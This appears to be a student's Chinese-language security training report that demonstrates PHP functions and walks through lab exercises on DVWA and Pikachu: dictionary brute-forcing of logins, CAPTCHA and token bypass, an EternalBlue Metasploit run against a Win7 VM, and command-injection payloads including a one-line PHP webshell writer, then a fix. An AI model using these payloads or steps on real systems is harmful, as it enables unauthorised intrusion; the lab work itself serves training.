---
title: "Web安全综合实训：PHP安全函数、暴力破解与命令执行漏洞"
published: 2025-01-01
description: "涵盖PHP安全函数讲解、DVWA与Pikachu靶场暴力破解、永恒之蓝漏洞利用、命令执行漏洞利用与修复的完整安全实训。"
tags: ["PHP", "DVWA", "Pikachu", "暴力破解", "命令执行", "永恒之蓝", "Web安全"]
category: "大三下实训"
---

1、演示并解释如下函数的作用，需要截图描述

stripslashes、explode、is_numeric、array_keys、str_replace

（1）stripslashes()作用：删除字符串中的反斜杠，常用来处理转义字符，防止注入payload被转义失效

演示如下：

完整代码：

![图片](./images/jr4_65_img2.png)

执行结果：
![图片](./images/jr4_65_img3.png)

可以看到，页面显示正常的英文句子，反斜杠被删除。

（2）explode()作用：把字符串按指定符号拆分成数组，是处理命令、路径、参数最常用的函数。

演示如下：

完整代码：

![图片](./images/jr4_65_img4.png)

执行结果：

![图片](./images/jr4_65_img5.png)

可以看到，页面输出数组结构，分成 3 个元素：127.0.0.1、root、123456

（3）is_numeric()作用：判断变量是不是纯数字，是数字就返回true，不是就返回false，用于安全过滤

演示如下：

完整代码：

![图片](./images/jr4_65_img6.png)

执行结果：

![图片](./images/jr4_65_img7.png)

（4）array_keys()作用：获取数组所有的键名，返回一个新数组

演示如下：

完整代码：

![图片](./images/jr4_65_img8.png)

执行结果：

![图片](./images/jr4_65_img9.png)

可以看到，输出新数组只包含键名：name和age。

（5）str_replace()作用：字符串替换，把指定内容替换成目标内容，常用于过滤危险字符

演示如下：

完整代码：

![图片](./images/jr4_65_img10.png)

执行结果：

![图片](./images/jr4_65_img11.png)

可以看到，输出：flag.php，cat被替换为空。

2、解释dvwa靶场，impossible难度的命令执行漏洞核心代码的作用

![图片](./images/jr4_65_img12.png)

从核心代码中可以看出，强制输入内容必须是四段式IP，每一段必须是纯数字，任何符号（如：| & ;）都无法使用。

3、尝试暴力破解dvwa靶场的低难度，给出爆破的流程以及结果证明

打开Yakit，点击MITM。

![图片](./images/jr4_65_img13.png)

点击免配置启动——启动免配置

![图片](./images/jr4_65_img14.png)

![图片](./images/jr4_65_img15.png)

提前在win7虚拟机装好DVWA靶场，然后浏览器访问win7虚拟机的ip，192.168.214.139，进入靶场

![图片](./images/jr4_65_img16.png)

登录靶场

![图片](./images/jr4_65_img17.png)

点击重置

![图片](./images/jr4_65_img18.png)

设置难度为low

![图片](./images/jr4_65_img19.png)

随便输入用户名和密码，Yakit抓到包

![图片](./images/jr4_65_img20.png)

![图片](./images/jr4_65_img21.png)

选择GET方法的数据包，点击FUZZ发送

然后对username=后面以及password=后面的内容进行插入模糊测试字典操作

![图片](./images/jr4_65_img22.png)

![图片](./images/jr4_65_img23.png)

选择username的字典插入

![图片](./images/jr4_65_img24.png)

password插入字典操作类似，这里不过多展示。

之后，发送请求

![图片](./images/jr4_65_img25.png)

对结果进行筛选

![图片](./images/jr4_65_img26.png)

结果如图

![图片](./images/jr4_65_img27.png)

去验证能否成功登录

![图片](./images/jr4_65_img28.png)

暴力破解成功！

4、尝试利用永恒之蓝漏洞，注意永恒之蓝漏洞的目标靶机win7，需要关闭防火墙，安装好系统后不能够打补丁，不能装VMware tools，已经装好的可以重新安装win7作为靶机

利用步骤

启动msf：msfconsole

加载模块：use exploit/windows/smb/ms17_010_eternalblue

![图片](./images/jr4_65_img29.png)

设置目标IP：set rhost 靶机IP

先查询win7靶机的ip

![图片](./images/jr4_65_img30.png)

![图片](./images/jr4_65_img31.png)

运行：run

成功拿到meterpreter权限

![图片](./images/jr4_65_img32.png)

5、尝试dvwa靶场中等难度的暴力破解操作，给出结果。为中等难度靶场源码做注释

设置难度

![图片](./images/jr4_65_img33.png)

依旧随便输入用户名和密码，然后Yakit抓包

![图片](./images/jr4_65_img34.png)

选择GET方法数据包，点击FUZZ发送

![图片](./images/jr4_65_img35.png)

依旧插入字典操作

![图片](./images/jr4_65_img36.png)

然后发送请求

![图片](./images/jr4_65_img37.png)

暴力破解成功

![图片](./images/jr4_65_img38.png)

去登录看看

![图片](./images/jr4_65_img39.png)

靶场源码注释：

![图片](./images/jr4_65_img40.png)

可以看到，这里只是做了简单转义+MD5加密，没有防爆破机制，依然可以被字典跑出来。

6、尝试搜索文章安装pikachu靶场，并且对学过的暴力破解和命令执行漏洞进行通关操作，phpstudy数据库连接账户密码都是root

暴力破解：

基于表单的暴力破解

先随便输入用户名和密码，然后Yakit抓包

![图片](./images/jr4_65_img41.png)

![图片](./images/jr4_65_img42.png)

依旧对username=和password=后面的内容做插入模糊字典操作

![图片](./images/jr4_65_img43.png)

发送请求

![图片](./images/jr4_65_img44.png)

破解成功

![图片](./images/jr4_65_img45.png)

去验证一下

![图片](./images/jr4_65_img46.png)

验证码绕过（on server）

先随便输入用户名和密码，然后输入验证码，依旧Yakit抓包

![图片](./images/jr4_65_img47.png)

点击了两次发送请求，都是显示用户名或密码不存在，但理论上第二次发送请求时会显示验证码错误，这里不显示，只能说明验证码实际上没有发生更新。

![图片](./images/jr4_65_img48.png)

这样，我们就可以不用管验证码，依旧用字典破解用户名和密码

![图片](./images/jr4_65_img49.png)

破解成功

![图片](./images/jr4_65_img50.png)

验证一下看看

![图片](./images/jr4_65_img51.png)

验证码绕过（on client）

随便输入登录，抓包

![图片](./images/jr4_65_img52.png)

查看网页源码，得知这里生成的验证码只是在网页上生成，验证也是验证网页上自己生成的验证码，并不经过服务器。所以可以直接不管验证码，依旧对用户名和密码使用字典破解即可。

![图片](./images/jr4_65_img53.png)

破解成功

![图片](./images/jr4_65_img54.png)

Token

网址那个位置回车一下，抓包，发送

![图片](./images/jr4_65_img55.png)

![图片](./images/jr4_65_img56.png)

![图片](./images/jr4_65_img57.png)

点击保存

点击调试

![图片](./images/jr4_65_img58.png)

![图片](./images/jr4_65_img59.png)

成功拿到token

![图片](./images/jr4_65_img60.png)

设置变量

![图片](./images/jr4_65_img70.png)

回到登录页面，随便输入登录

![图片](./images/jr4_65_img61.png)

抓包，发送并跳转

![图片](./images/jr4_65_img62.png)

修改成以下内容

![图片](./images/jr4_65_img63.png)

![图片](./images/jr4_65_img64.png)

![图片](./images/jr4_65_img65.png)

破解成功

![图片](./images/jr4_65_img66.png)

命令执行漏洞

exec "ping"

正常测试：输入 127.0.0.1，点击提交，页面正常返回ping的结果，无异常

![图片](./images/jr4_65_img67.png)

恶意拼接命令：利用命令拼接符（|、&&、||），在IP后拼接系统命令，常用payload：

输入127.0.0.1 | dir（| 表示不管前一条命令是否成功，直接执行后一条），提交后页面不仅返回ping结果，还会列出当前目录所有文件；

![图片](./images/jr4_65_img68.png)

输入127.0.0.1 | whoami，能查看当前用户

![图片](./images/jr4_65_img69.png)

输入127.0.0.1 | ipconfig，能查看网卡信息

![图片](./images/jr4_65_img1.png)

以上可看出，页面成功返回恶意命令的执行结果，证明存在远程命令执行漏洞，服务器完全可控。

exec "eval"

输入phpinfo();，点击提交，页面直接弹出PHP信息页面，证明代码被成功执行

![图片](./images/jr4_65_img71.png)

还可以上传一句话木马：payload:

fputs(fopen('shell.php','w'),'<?php assert($_POST["eval"]?>');

查看相应目录，上传成功！

![图片](./images/jr4_65_img72.png)

7、尝试编写代码修复pikachu靶场的命令执行漏洞

漏洞原因：没有过滤用户输入，直接拼接到系统命令中

修复代码：

![图片](./images/jr4_65_img73.png)

修复的效果：任何| & ;等命令连接符都会被清空，无法拼接恶意命令，漏洞彻底修复。
